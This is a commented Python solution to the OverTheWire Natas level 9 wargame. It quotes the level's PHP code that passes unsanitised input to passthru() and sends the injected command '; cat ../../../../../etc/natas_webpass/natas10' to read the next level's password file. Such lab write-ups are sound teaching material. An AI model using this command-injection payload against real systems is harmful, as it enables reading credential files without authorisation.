'''
For this challenge you have to know some things about Linux and how the commands in terminal work.
'''
import requests
import re

username = "natas9"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text) # get the secret
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text) # get the secret
print("="*50)

'''
Looking throught the "index-source.html" you can see the next part of code:
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>

The first thing that we notice is that there is not string sanitation, so we can "abuse" the function passthru() to execute another command and read something else and not (only) the "dictionary.txt" file.
So we can stop one command with the symbol ";" and after we can start another command.
'''

# In my cmd (payload) I stopped the grep command with the ";", and after I use the cat command to read a more insteresting file.
cmd = "; cat ../../../../../etc/natas_webpass/natas10"
response = session.post(url,auth=(username,password),data={"needle":cmd}) # POST request to send my "payload" to the server.
print(response.text)
print("="*50)

# Just Code Printing
code = re.findall(r"[A-Za-z0-9]{32}", response.text)[1]
print("The password for the next level is: " + code)
